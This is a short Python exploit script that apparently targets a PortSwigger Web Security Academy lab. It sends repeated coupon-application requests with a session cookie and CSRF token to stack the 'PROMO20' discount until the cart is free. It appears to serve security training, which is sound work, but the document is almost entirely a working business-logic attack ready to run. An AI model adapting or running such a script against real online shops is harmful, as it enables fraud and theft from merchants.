import asyncio
import aiohttp
import time
from aiohttp import TCPConnector

# CONFIGURABLE VARIABLES - EDIT THESE
hostid = '0a99000b034d1e9c83117d7e006100d0'
cookies_session = 'gkPkvG4hppMAxrKAMADlUr8f8PpBjyuV'
csrftoken = 'YSEgDrGqlm7IYUSOb5nOV494wnyRYG5x'
payload = 'PROMO20'
total_requests = 20
request_timeout = 3

async def sequential_attack():
    url = f"https://{hostid}.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": f"session={cookies_session}"
    }
    data = f"csrf={csrftoken}&coupon={payload}"
    
    successes = 0
    
    print(f"[*] Starting Burp-style sequential attack at {time.ctime()}")
    print(f"[*] Target: {hostid}.web-security-academy.net")
    print(f"[*] Configuration: {total_requests} sequential requests, separate connections")
    print(f"[*] Payload: {payload} | Timeout: {request_timeout}s")
    print("-" * 60)
    
    for i in range(total_requests):
        start = time.time()
        try:
            # NEW CONNECTION for each request (no pooling)
            connector = TCPConnector(limit=1, force_close=True)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=request_timeout)) as resp:
                    end = time.time()
                    body = await resp.text()
                    
                    if "Coupon already applied" in body:
                        result = "DUPLICATE"
                    elif "apply coupon" in body or (resp.status == 200 and len(body) == 7171):
                        result = "SUCCESS"
                        successes += 1
                    else:
                        result = f"OTHER_{resp.status}"
                    
                    print(f"[{i:02d}] {result} | Time: {(end-start):.3f}s | Successes: {successes}")
        
        except asyncio.TimeoutError:
            end = time.time()
            print(f"[{i:02d}] TIMEOUT | Time: {(end-start):.3f}s")
        except Exception as e:
            end = time.time()
            print(f"[{i:02d}] ERROR: {str(e)} | Time: {(end-start):.3f}s")
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] Total successes: {successes}")
    
    if successes >= 5:
        print("[+] FREE CART ACHIEVED!")
    else:
        print(f"[-] Need {5-successes} more successes")

if __name__ == "__main__":
    asyncio.run(sequential_attack())
